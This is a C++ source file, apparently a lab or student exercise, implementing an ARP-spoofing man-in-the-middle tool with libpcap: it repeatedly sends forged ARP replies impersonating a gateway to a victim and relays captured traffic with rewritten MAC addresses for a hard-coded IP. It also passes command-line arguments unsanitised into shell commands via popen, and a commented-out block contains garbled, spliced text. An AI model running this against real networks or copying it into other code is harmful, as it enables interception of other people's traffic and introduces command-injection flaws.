//#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
//#include <fstream>
#include <sstream>
#include <algorithm>
//#include <cstdio>
//#include <cstring>
//#include <stdio.h>
//#include <array>
//#include <glog/logging.h>

#include <thread>
#include <chrono>
#include <libnet.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


string cmd(string command) {
    std::string result;
    char buffer[128];

    FILE* pipe = popen(command.c_str(), "r");

    if (!pipe) {
        return "Error: popen failed!";
    }

    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }

    pclose(pipe);

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

using MAC = uint8_t[6];
//using MAC = std::array<uint8_t, 6>;
void macFstr(string strMac, MAC &mac){
    //MAC mac;
    std::istringstream iss(strMac);
    iss >> std::hex;
     for (int i = 0; i < 6; ++i) {
        unsigned int val;
        char tmp;
        iss >> val;
        if (i < 5) {
            iss >> tmp;
        }
        mac[i] = static_cast<uint8_t>(val);
    }
    //return mac;
}


string getMymac(string inter) {
    string command = "ifconfig " + inter;
    string output = cmd(command);
    istringstream iss(output);

    string line;

    while (getline(iss, line)) {
        auto pos = line.find("ether ");
        if (pos != string::npos) {
            MAC mac;
            string macT = line.substr(pos + 6, 17);
            //macFstr(macT, mac);
            //return macFstr(mac);
            return macT;
        }

    }
    return "";
}

string getVmac(string vip) {
    //MAC mac;
    string command = "arp -n " + vip + " | awk '/" + vip + "/ {print $3}' ";
    string output = cmd(command);
    //mac=macFstr(output);    
    //macFstr(output, mac);
    return output;
}

void arpSpoof(string senderIp, string targetIp, string inter) { 
    EthArpPacket packet;

    //string arpUp = "sudo arping -c 3 " + senderIp; 
    //cmd(arpUp);

    string smac=getVmac(senderIp); //sender mac 받아오기
    string mymac = getMymac(inter); //Attacker mac(나)

    packet.eth_.dmac_ = Mac(smac);
    packet.eth_.smac_ = Mac(mymac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(mymac);
    packet.arp_.sip_ = htonl(Ip(targetIp)); //gateway ip
    packet.arp_.tmac_ = Mac(smac);
    packet.arp_.tip_ = htonl(Ip(senderIp)); //victim ip

    const char* dev = inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    while (1) {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        this_thread::sleep_for(std::chrono::seconds(5));//5초 간격으로 스푸핑 때림.    
    }

    pcap_close(handle);
}

void packetHandler(u_char* userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
  
    struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + 14);
    char src_ip_str[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(ip_hdr->ip_src), src_ip_str, INET_ADDRSTRLEN);
    
    string str="192.168.35.73";
    char sip[INET_ADDRSTRLEN];
    strcpy(sip, str.c_str());

    u_int8_t m1[ETHER_ADDR_LEN] = {0x58, 0x1C, 0xF8, 0xF3, 0xF7, 0xEB};
    u_int8_t m2[ETHER_ADDR_LEN] = {0x00, 0x23, 0xAA, 0x44, 0xB2, 0x98};
    //if(string(src_ip_str)==str)
    if(!strcmp(sip, src_ip_str)){
        cout << "Source IP: " << src_ip_str << endl;
        std::memcpy(eth_hdr->ether_shost, m1, ETHER_ADDR_LEN);
        std::memcpy(eth_hdr->ether_dhost, m2, ETHER_ADDR_LEN);
    }

    const char* dev = "eth0";//inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];
    
    pcap_t* handle = pcap_create(dev, errbuf);  
    pcap_activate(handle);//핸들 활성화.
    int res = pcap_sendpacket(handle, packet, pkthdr->len);
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        

    pcap_close(handle);
}

void Listen(string inter) { //스레드2, ip로 필터 걸고 relay호출할것 or 리턴하고 메인에서 릴레이. getSpoofed()
    //LnR (리슨 앤 릴레이)
    const char* dev = inter.c_str();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf);
   
    if (handle == nullptr) {
        std::cerr << "Couldn't open interface eth0: " << errbuf << std::endl;
    }
    pcap_loop(handle, 0, packetHandler, nullptr);

}

int main(int argc, char* argv[]) {
    //google::InitGoogleLogging(argv[0]);
    //FLAGS_log_dir="logs";//LOG(INFO) << "hello world";
    //memcpy(sip, argv[2], sizeof(argv));
    //cout<<sip<<endl;
    if (argc < 4) {

        
        cout<<"why?"<<endl;
	    return 0;
    }

    thread autoArp(arpSpoof, argv[2], argv[3], argv[1]); //s ip, t ip, interface
    thread listener(Listen, argv[1]);

    autoArp.detach(); //메인 스레드와 관계없이 돌아감.
    listener.detach();

    while (true) { //대기 걸어줌
        this_thread::sleep_for(std::chrono::seconds(1));
    }
/*

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];   
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %//cmd 창에서 ARP테이블 업데이트s(%s)\n", dev, errbuf);
        return -1;
    }
    //MAC mymac;
    //getMymac(argv[1], mymac);
    string mymac=getMymac(argv[1]);

    for (int i = 2; i < argc; i=i+2) {
        EthArpPacket packet;

	string arpUp = "sudo arping -c 5 " + (string)argv[i];
        cmd(arpUp);

        //MAC vmac;
        //getVmac(argv[i], vmac); //victim mac

        st//cmd 창에서 ARP테이블 업데이트ring vmac=getVmac(argv[i]);

        packet.eth_.dmac_ = vmac;//Mac(vmac);
        packet.eth_.smac_ = mymac;//Mac(mymac);
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(mymac);
        packet.arp_.sip_ = htonl(Ip(argv[i+1])); //gateway ip
        packet.arp_.tmac_ = Mac(vmac);
        packet.arp_.tip_ = htonl(Ip(argv[i])); //victim ip

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        pcap_close(handle);
    }
    */









}

